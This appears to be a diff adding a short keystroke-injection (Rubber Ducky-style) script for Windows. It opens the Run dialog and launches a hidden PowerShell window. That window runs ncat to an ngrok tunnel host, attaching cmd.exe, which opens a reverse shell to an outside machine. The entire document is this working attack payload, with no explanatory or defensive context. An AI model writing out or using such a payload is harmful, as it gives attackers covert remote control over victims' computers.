@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "ncat 0.tcp.in.ngrok.io 19628 -e cmd.exe"
+ENTER
